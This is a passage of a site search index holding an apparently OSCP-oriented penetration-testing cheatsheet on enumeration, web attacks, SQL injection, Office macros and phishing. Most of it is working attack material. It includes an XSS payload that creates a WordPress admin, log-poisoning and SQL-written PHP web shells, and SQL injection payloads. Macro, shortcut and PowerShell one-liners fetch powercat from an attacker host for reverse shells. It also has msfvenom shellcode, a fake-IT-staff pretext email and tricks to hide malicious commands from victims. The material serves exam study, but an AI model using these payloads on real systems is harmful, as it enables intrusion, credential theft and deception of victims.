<code>ls -1 /usr/share/nmap/scripts/smb*</code></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#smtp-enumeration","title":"SMTP Enumeration","text":"<pre><code>## Nmap Enumeration\nnmap --script smtp-* &lt;IP_Address&gt; -p25\n\n## Connect to target\nnc &lt;IP&gt; 25\ntelnet &lt;IP&gt; 25\n\n## Start Communication\n&gt; HELO domain.com                      \n\n## User Enumeeration\n&gt; MAIL FROM: user@domain.com\n&gt; RCPT TO: root@domain.com              \n&gt; EXPN root                             \n&gt; VRFY root                            \n\n$ smtp-user-enum -M VRFY -U users.txt -t &lt;IP_Address&gt;\n$ smtp-user-enum -M EXPN -U users.txt -t &lt;IP_Address&gt;\n$ smtp-user-enum -M RCPT -U users.txt -t &lt;IP_Address&gt;\n$ smtp-user-enum -M VRFY -u root -t &lt;IP_Address&gt;\n</code></pre> <p>Enable Telnet on Windows</p> <p><code>PS &gt; dism /online /Enable-Feature /FeatureName:TelnetClient</code></p> <p>Python Script</p> <pre><code>#!/usr/bin/python\n\nimport socket\nimport sys\n\nif len(sys.argv) != 3:\n        print(\"Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;\")\n        sys.exit(0)\n\n## Create a Socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n## Connect to the Server\nip = sys.argv[2]\nconnect = s.connect((ip,25))\n\n## Receive the banner\nbanner = s.recv(1024)\n\nprint(banner)\n\n## VRFY a user\nuser = (sys.argv[1]).encode()\ns.send(b'VRFY ' + user + b'\\r\\n')\nresult = s.recv(1024)\n\nprint(result)\n\n## Close the socket\ns.close()\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#snmp-enumeration","title":"SNMP Enumeration","text":"<p>SNMP MIB TREE</p> 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.4.2.1.5 Processes Param 1.3.6.1.2.1.2.2.1.2 Interfaces 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports <p>Nmap Script Scan</p> <p><code>nmap -sU -p 161 --script [script_name] [target]</code></p> <p>Nmap Community String Brute Force</p> <p><code>nmap -sU -p 161 --script snmp-brute [target]</code></p> <p><code>nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=&lt;wordlist&gt; [target]</code></p> <p>Wordlist - /usr/share/wordlist/seclists/Misc/wordlist-common-snmp-community-strings.txt</p> <p>onesixtyone Community String Brute Force</p> <pre><code>## Wordlist */usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt*\necho public &gt; community\necho private &gt;&gt; community\necho manager &gt;&gt; community\n\nfor ip in $(seq 1 254); do echo 10.10.10.$ip; done &gt; ips\n\nonesixtyone -c community -i ips\n</code></pre> <p>snmpwalk Enumeration</p> <p><code>snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB]</code></p> <p><code>snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB] -O a</code></p> <p>snmpwalk Change Value of an Attribute</p> <p><code>snmpset -v [1/2c/3] -c [community string] [target_ip] [MIB] [var type] [value]</code></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#llm-powered-active-information-gathering","title":"LLM-Powered Active Information Gathering","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-llm-aided-enumeration","title":"Active LLM-Aided enumeration","text":"<p>Generate Subdomains </p> <pre><code>Using public data from [MegacorpOne's] website and any information that can be inferred about its organizational structure, products, or services, generate a comprehensive list of potential subdomain names.\n    \u2022   Incorporate common patterns used for subdomains, such as:\n    \u2022   Infrastructure-related terms (e.g., \"api\", \"dev\", \"test\", \"staging\").\n    \u2022   Service-specific terms (e.g., \"mail\", \"auth\", \"cdn\", \"status\").\n    \u2022   Departmental or functional terms (e.g., \"hr\", \"sales\", \"support\").\n    \u2022   Regional or country-specific terms (e.g., \"us\", \"eu\", \"asia\").\n    \u2022   Factor in industry norms and frequently used terms relevant to [MegacorpOne's] sector.\n\nFinally, compile the generated terms into a structured wordlist of 1000  words, optimized for subdomain brute-forcing against megacorpone.com\n\nEnsure the output is in a clean, lowercase format with no duplicates, no bulletpoints and ready to be copied and pasted.\nMake sure the list contains 1000 unique entries.\n</code></pre> <p>DNS Enumeration</p> <p><code>gobuster dns -d [domain.com] -w [LLM Wordlist] -t 10</code></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#vulnerability-scanning","title":"Vulnerability Scanning","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#vulnerability-scanning-with-nessus","title":"Vulnerability Scanning with Nessus","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#installing-nessus","title":"Installing Nessus","text":"<p>Install via Docker:</p> <p><code>docker pull tenable/nessus:latest-ubuntu</code></p> <p><code>docker run --name \"Nessus\" -d -p 8834:8834 tenable/nessus:latest-ubuntu</code></p> <p>Install Locally</p> <pre><code>curl --request GET \\\n  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.9.1-ubuntu1804_aarch64.deb' \\\n  --output 'Nessus-10.9.1-ubuntu1804_aarch64.deb'\n</code></pre> <p><code>sudo apt install ./Nessus-10.9.1-ubuntu1804_aarch64.deb</code></p> <p><code>sudo systemctl start nessusd.service</code></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#vulnerability-scanning-with-nmap","title":"Vulnerability Scanning with Nmap","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#nse-vulnerability-scripts","title":"NSE Vulnerability Scripts","text":"<p>Nmap Scripts</p> <p><code>cd /usr/share/nmap/scripts/</code></p> <p><code>cat script.db  | grep \"\\\"vuln\\\"\u201d</code></p> <p><code>sudo nmap -sV -p 443 --script \"vuln\" [IP]</code></p> <p>Run Script Manually</p> <pre><code>wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve-2021-41773.nse\n\nsudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse\nsudo nmap --script-updatedb\n\nsudo nmap -sV -p 443 --script \"http-vuln-cve2021-41773\" [IP]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#introduction-to-web-application-attacks","title":"Introduction to Web Application Attacks","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#web-application-assessment-tools","title":"Web Application Assessment Tools","text":"<p>Fingerprinting Web Servers with Nmap</p> <ul> <li><code>sudo nmap -p80,443  -sV [IP]</code></li> <li><code>sudo nmap -p80 --script=http-enum [IP]</code></li> </ul> <p>Technology Stack Identification with Wappalyzer</p> <p>Wappalyzer</p> <p>Directory Brute Force</p> <ul> <li><code>ffuf -c -w [wordlist] -u [URL/FUZZ]</code></li> <li><code>gobuster dir -w [wordlist] -u [URL] -t 5</code></li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#web-application-enumeration","title":"Web Application Enumeration","text":"<ul> <li>Debugging Page Content<ul> <li>Firefox \u2192 Debugger</li> <li>Firefox \u2192 Inspector</li> </ul> </li> <li>Inspecting HTTP Response Headers and Sitemaps</li> <li>Enumerating and Abusing APIs<ul> <li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v1]</code></li> <li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v2]</code></li> <li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v3]</code></li> <li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v4]</code></li> </ul> </li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#cross-site-scripting","title":"Cross-Site Scripting","text":"<p>Wordpress - Create admin user via XSS</p> <pre><code>var ajaxRequest = new XMLHttpRequest();\nvar requestURL = \"/wp-admin/user-new.php\";\nvar nonceRegex = /ser\" value=\"([^\"]*?)\"/g;\najaxRequest.open(\"GET\", requestURL, false);\najaxRequest.send();\nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);\nvar nonce = nonceMatch[1];\nvar params = \"action=createuser&amp;_wpnonce_create-user=\"+nonce+\"&amp;user_login=attacker&amp;email=attacker@offsec.com&amp;pass1=attackerpass&amp;pass2=attackerpass&amp;role=administrator\";\najaxRequest = new XMLHttpRequest();\najaxRequest.open(\"POST\", requestURL, true);\najaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\najaxRequest.send(params);\n</code></pre> <p>JSCompress - The JavaScript Compression Tool</p> <p>Encode the JavaScript code, so any bad characters won't interfere with sending the payload</p> <pre><code>function encode_to_javascript(string) {\n            var input = string\n            var output = '';\n            for(pos = 0; pos &lt; input.length; pos++) {\n                output += input.charCodeAt(pos);\n                if(pos != (input.length - 1)) {\n                    output += \",\";\n                }\n            }\n            return output;\n        }\n\nlet encoded = encode_to_javascript('insert_minified_javascript')\nconsole.log(encoded)\n</code></pre> <p>Final Exploit</p> <pre><code>curl -i http://offsecwp --user-agent \"&lt;script&gt;eval(String.fromCharCode(Encoded Javascript Code))&lt;/script&gt;\" --proxy 127.0.0.1:8080\n</code></pre> <p>Wordpress Vulnerable Plugin:</p> <p>WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload</p> <p>https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#common-web-application-attacks","title":"Common Web Application Attacks","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#directory-traversal","title":"Directory Traversal","text":"<ul> <li>Absoluta Path:<ul> <li><code>/etc/passwd</code></li> </ul> </li> <li>Relative path:<ul> <li><code>../../../etc/passwd</code></li> </ul> </li> </ul> <p>Identifying and Exploiting Directory Traversals:</p> <ul> <li>Windows:<ul> <li>C:\\Windows\\System32\\drivers\\etc\\hosts</li> </ul> </li> <li>Linux:<ul> <li>/etc/passwd</li> </ul> </li> </ul> <p>Encoding Special Characters <code>curl http://domain.com/cgi-bin/2%e/2%e/2%e/2%e/2%e/etc/passwd</code></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#file-inclusion-vulnerabilities","title":"File Inclusion Vulnerabilities","text":"\ud83d\udca1  File Inclusion vulnerabilities can execute local or remote files, while Directory Traversal only allows us to read the contents of a file"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#local-file-inclusion-lfi","title":"Local File Inclusion (LFI)","text":"<p>Apache Log Files</p> <ul> <li>Linux<ul> <li>/var/log/apache2/access.log</li> </ul> </li> <li>Windows<ul> <li>C:\\xampp\\apache\\logs\\</li> </ul> </li> </ul> <p>Apache Log Poisoning</p> <pre><code>#Linux\ncurl --path-as-is \"http://doman.com/index.php?page=../../../../../var/log/apache2/access.log\"\n\ncurl --path-as-is \"http://doman.com/index.php?page=../../../../../var/log/apache2/access.log\" -H \"User-Agent: &lt;?php echo system(\\$_GET['cmd']); ?&gt;\"\n\ncurl --path-as-is \"http://doman.com/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=whoami\"\n\n#Windows\ncurl --path-as-is \"http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log\"\n\ncurl --path-as-is \"http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log\" -H \"User-Agent: &lt;?php echo system(\\$_GET['cmd']); ?&gt;\"\n\n curl --path-as-is \"http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log&amp;cmd=whoami\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#php-wrappers","title":"PHP Wrappers","text":"PHP Wrappers Description /index.php?page=php://filter/read=convert.base64-encode/resource=admin.php Read PHP with base64 filter /index.php?page=data://text/plain, RCE with data wrapper /index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls RCE with base64 encoded data wrapper index.php?page=expect://id RCE with expect wrapper curl -s -X POST --data '' \"http://:/index.php?page=php://input&amp;cmd=id\" RCE with input wrapper"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#remote-file-inclusion-rfi","title":"Remote File Inclusion (RFI)","text":"\ud83d\udca1  We could also use a publicly-accessible file, such as one from Github.   <pre><code>## Webshells - /usr/share/webshells/\n\npython3 -m http.server 80\n\ncurl \"http://domain.com/index.php?page=http://&lt;Local IP&gt;/simple-backdoor.php&amp;cmd=whoami\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#file-upload-vulnerabilities","title":"File Upload Vulnerabilities","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#using-executable-files","title":"Using Executable Files","text":"\ud83d\udca1  Upload malicious files. In case of extension blacklist, enumerate web server and framework and use extension bypass techniques accordingly."},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#using-non-executable-files","title":"Using Non-Executable Files","text":"\ud83d\udca1  Leverage File Upload with Directory Traversal vulnerability, that allows us to overwrite critical files such as SSH a*uthorized_keys* file.  Example:  ***filename=\"../../../../../../../root/.ssh/authorized_keys\u201d***    \ud83d\udca1  When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use."},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#command-injection","title":"Command Injection","text":"<p>Check where command is executed (CMD/PowerShell):</p> <pre><code>(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell\n</code></pre> <p>Using Powercat to Create Reverse Shell</p> <pre><code>#Upload Powercat to Vulnerable Windows\ncd /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1\npython3 -m http.server 80\n\n## Execute Powercat to get a Reverse Shell\nIEX (New-Object System.Net.Webclient).DownloadString(\"http://&lt;IP&gt;/powercat.ps1\");powercat -c &lt;IP&gt; -p &lt;PORT&gt; -e powershell \n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#sql-injection-attacks","title":"SQL Injection Attacks","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#sql-theory-and-databases","title":"SQL Theory and Databases","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#db-types-and-characteristics","title":"DB Types and Characteristics","text":"<p>MySQL</p> <pre><code>mysql -u [user] -p [pass] -h [IP] -P [PORT] --skip-ssl\n\nMySQL &gt; select version();\nMySQL &gt; select system_user();\nMySQL &gt; show databases;\nMySQL &gt; SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';\n</code></pre>  \ud83d\udca1  The *root* user retrieved with *select system_user();* is the database-specific root user, not the system-wide administrative root user.   <p>MSSQL</p> <pre><code>impacket-mssqlclient [USER]:[PASS]@[IP] -windows-auth\n\nSQL &gt; SELECT @@version;\nSQL &gt; SELECT name FROM sys.databases;\nSQL &gt; SELECT * FROM offsec.information_schema.tables;\nSQL &gt; SELECT * from offsec.dbo.users;\nSQL &gt; SELECT * FROM master.sys.server_principals\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#manual-sql-exploitation","title":"Manual SQL Exploitation","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#error-based-payloads","title":"Error-based Payloads","text":"<p>SQL code vulnerable to Error-based SQL Injection</p> <pre><code>&lt;?php\n$uname = $_POST['uname'];\n$passwd =$_POST['password'];\n\n$sql_query = \"SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'\";\n$result = mysqli_query($con, $sql_query);\n?&gt;\n</code></pre> <p>Error-based payloads</p> <pre><code>## Auth Bypass.\noffsec' OR 1=1 -- // \n\n## Enumerating the database directly\noffsec' OR 1=1 in (SELECT @@version) -- //\noffsec' OR 1=1 in (SELECT * FROM users) -- //\noffsec' or 1=1 in (SELECT password FROM users) -- //\noffsec' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#union-based-payloads","title":"UNION-based Payloads","text":"<p>SQL code vulnerable to UNION-based SQL Injection</p> <pre><code>$query = \"SELECT * from customers WHERE name LIKE '\".$_POST[\"search_input\"].\"%'\";\n</code></pre> <p>For UNION SQLi attacks to work, first need to satisfy two conditions:</p> <ol> <li>The injected UNION query has to include the same number of columns as the original query.</li> <li>The data types need to be compatible between each column.</li> </ol> <p>UNION-based payloads</p> <pre><code>## Discover the correct number of columns\n' ORDER BY 1-- //   \n\n## Determine which columns are displayed\n%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //\n\n## Enumerate the database\n%' UNION SELECT database(), user(), @@version, null, null -- //\n%' UNION SELECT null, null, database(), user(), @@version -- //\n\n' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //\n\n' UNION SELECT null, username, password, description, null FROM users -- //\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#blind-sql-injections","title":"Blind SQL Injections","text":"<p>BLIND SQLi payloads</p> <pre><code>## Test for boolean-based SQLi\noffsec' AND 1=1 -- //\n\n## Test for time-based SQLi\noffsec' AND IF (1=1, sleep(3),'false') -- //\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#manual-and-automated-code-execution","title":"Manual and Automated Code Execution","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#manual-code-execution","title":"Manual Code Execution","text":"<p>MSSQL - xp_cmdshell</p> <pre><code>impacket-mssqlclient [USER]:[PASS]@[IP] -windows-auth\n\nEXECUTE sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXECUTE sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\nEXECUTE xp_cmdshell 'whoami';\n</code></pre> <p>MySQL - write files on the web server.</p> <pre><code>' UNION SELECT \"&lt;?php system($_GET['cmd']);?&gt;\", null, null, null, null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" -- //\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#automating-the-attack","title":"Automating the Attack","text":"<p>SQLmap</p> <pre><code>sqlmap -r [request] -p [param]  --os-shell  --web-root \"/var/www/html/\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#client-side-attacks","title":"Client-side Attacks","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#target-reconnaissance","title":"Target Reconnaissance","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#information-gathering_1","title":"Information Gathering","text":"<p>Browser through the target website and gather metadata of documents:</p> <p><code>exiftool -a -u document.pdf</code></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#client-fingerprinting","title":"Client Fingerprinting","text":"<p>Device Fingerprinting via canavarytokens</p> <p>Know.  Before it matters</p> <p>User-Agent header parser via whatismybrowser.com</p> <p></p> <p>Browser Fingerprint via fingerprintjs</p> <p>https://github.com/fingerprintjs/fingerprintjs</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#exploiting-microsoft-office","title":"Exploiting Microsoft Office","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#preparing-the-attack","title":"Preparing the Attack","text":"<p>To deliver our payload and increase the chances that the target opens the document, we could use a pretext and provide the document in another way, like a download link. </p> <p>Convince the target to click the Enable Editing button by, for example, blurring the rest of the document and instructing them to click the button to \"unlock\" it. </p> <p>We could also rely on other macro-enabled Microsoft Office programs that lack Protected View, like Microsoft Publisher, but this is less frequently installed. </p> <p>Finally, we must consider Microsoft's announcement that discusses blocking macros by default </p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#leveraging-microsoft-word-macros","title":"Leveraging Microsoft Word Macros","text":"<p>.doc and .docm can save or embed macros, while .docx cant. </p> <p>Choose Document1 (document) from the drop-down menu in the Macros dialog window to select our unnamed document. If do not, our macro will not be saved to the document but rather to our global template. </p> <p>Example of macros</p> <pre><code>Sub MyMacro()\n\n  CreateObject(\"Wscript.Shell\").Run \"powershell\"\n\nEnd Sub\n</code></pre> <p>Auto execute Powershell when a Word document is opened</p> <pre><code>Sub AutoOpen()\n\n  MyMacro\n\nEnd Sub\n\nSub Document_Open()\n\n  MyMacro\n\nEnd Sub\n\nSub MyMacro()\n\nEnd Sub\n</code></pre> <p>Reverse Shell macros via base64 encoded PowerCat</p> <p>We should note that VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string. This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them. </p>  \ud83d\udca1  UTF-16LE is the default character set for base64 encoding that PowerShell supports. If we choose any other character set, our payload won\u2019t work.   <pre><code>## PowrCat Reverse Shell Script\necho -n \"IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;IP&gt;/powercat.ps1');powercat -c &lt;IP&gt; -p &lt;PORT&gt; -e powershell\" | iconv -t UTF-16LE | base64 -w 0\n\npython3 -m http.server 80\n\n## Python Script to split the commands into multiple lines\nstr = \"powershell.exe -nop -w hidden -enc &lt;base64 encoded PowerCat script&gt;\"\nn = 50\nfor i in range(0, len(str), n):\n    print(\"Str = Str + \" + '\"' + str[i:i+n] + '\"')\n\n\n## Macro to get RCE\nSub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim Str As String\n\n    Str = Str + \"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU\"\n        Str = Str + \"AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd\"\n        Str = Str + \"AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB\"\n    ...\n        Str = Str + \"QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA\"\n        Str = Str + \"gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA\"\n        Str = Str + \"A== \"\n\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#abusing-windows-library-files","title":"Abusing Windows Library Files","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#obtaining-code-execution-via-windows-library-files","title":"Obtaining Code Execution via Windows Library Files","text":"<p>Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer. </p> <p>set up a WebDAV / SMB share on our Kali system</p> <pre><code>## https://wsgidav.readthedocs.io/en/latest/index.html\npip3 install wsgidav\napt install python3-wsgidav\n\n/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/\n</code></pre> <p>Create a Windows library file connecting to a WebDAV share</p> <p>***namespace for the library file***</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n...\n...\n...\n&lt;/libraryDescription&gt;\n</code></pre> <p>Add two tags providing information about the library</p> <p>We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 </p> <pre><code>&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n</code></pre> <p>Add the isLibraryPinned and iconReference tag</p> <pre><code>&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n</code></pre> <p>Add the templateInfo tags, which contain the folderType tags</p> <pre><code>&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n</code></pre> <p>Specify the storage location where our library file should point to</p> <pre><code>&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://10.10.10.10&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n</code></pre> <p>Entire Library File</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://10.10.10.10&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre> <p>Create Shortcut file and store it in WebDav share to get Reverse Shell</p> <pre><code>## Right-click on the desktop and click on New then on Shortcut\npowershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell\"\n</code></pre>  \ud83d\udca1  If we expect that our victims are tech-savvy enough to check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.   <p>Flow</p> <pre><code>## Pretext Email Example\nHello! My name is Dwight, and I'm a new member of the IT Team. \n\nThis week I am completing some configurations we rolled out last week.\nTo make this easier, I've attached a file that will automatically\nperform each step. Could you download the attachment, open the\ndirectory, and double-click \"automatic_configuration\"? Once you\nconfirm the configuration in the window that appears, you're all done!\n\nIf you have any questions, or run into any problems, please let me\nknow!\n\n## Send crafted config.Library-ms file via attached file.\n## Victim opens the config.Library-ms that points to File Explorer\n## File Explorer shows WebDAV share that contains crafted Reverse Shell Shortcut \n</code></pre>  \ud83d\udca1  &gt; We could also have combined this technique with our previous Office macro attack, or any other type of client-side attacks. &gt;"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#locating-public-exploits","title":"Locating Public Exploits","text":"<p>Online Exploit</p> <ul> <li>ExploitDB</li> </ul> <p>Offline Exploit</p> <ul> <li>SearchSploit<ul> <li><code>sudo apt update &amp;&amp; sudo apt install exploitdb</code></li> <li><code>searchsploit -m windows/remote/48537.py</code></li> </ul> </li> <li>Nmap NSE Scripts<ul> <li><code>grep Exploits /usr/share/nmap/scripts/*.nse</code></li> </ul> </li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#fixing-exploits","title":"Fixing Exploits","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#fixing-memory-corruption-exploits","title":"Fixing Memory Corruption Exploits","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#buffer-overflow-in-a-nutshell","title":"Buffer Overflow in a Nutshell","text":"<p>Vulnerable code that holds 64 Bit char in buffer variable</p> <pre><code>*buffer[64]*\n...\nstrcpy(buffer, argv[1]);\n</code></pre> <p></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#cross-compiling-exploit-code","title":"Cross-Compiling Exploit Code","text":"<p>MinGW-w64 Compiler</p> <pre><code>sudo apt install mingw-w64\n\ni686-w64-mingw32-gcc [C Program] -o [Output]\n\nwine [Output]\n</code></pre> <p>Generate C Shellcode</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] EXITFUNC=thread -f c \u2013e x86/shikata_ga_nai -b \"\\x00\\x0a\" -v shellcode\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#phishing-basics","title":"Phishing Basics","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#payloads-misdirection-and-speedbumps","title":"Payloads, Misdirection, and Speedbumps","text":"<p>Attackers can bypass MotW using exploits like CVE-2022-41091, though security patches often close these gaps quickly. </p> <p>If an EXE file reached its intended destination, most users are aware of the danger of this type of file. Because of this, attackers have moved to other types of files, including SCRfiles, HTA files, and JScriptfiles. </p> <p>Microsoft Office Vulnerabilities</p> <ul> <li>https://nvd.nist.gov/vuln/detail/CVE-2023-21716<ul> <li>PoCs for this vulnerability</li> </ul> </li> <li>https://nvd.nist.gov/vuln/detail/CVE-2017-11882</li> <li>https://nvd.nist.gov/vuln/detail/CVE-2023-21608<ul> <li>public PoCs for this vulnerability</li> </ul> </li> </ul> <p>URL Shortener</p> <ul> <li>TinyURL</li> <li>Bitly</li> </ul> <p>NTLM Theft</p> <p>https://www.proofpoint.com/uk/blog/threat-insight/ta577s-unusual-attack-chain-leads-ntlmdata-theft</p> <p>MFA Bypass Techniques</p> <ul> <li>prompt bombing</li> <li>browser-in-the-middle<ul> <li>cuddlephish</li> </ul> </li> <li>Brute Force</li> <li>SIM Swapping</li> <li>Social Enginerring</li> </ul>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#hands-on-credential-phishing","title":"Hands-On Credential Phishing","text":"<p>Cloning the Website</p> <pre><code>mkdir CloneWeb\ncd CloneWeb\n\nwget -E -k -K -p -e robots=off -H -Dzoom.us -nd 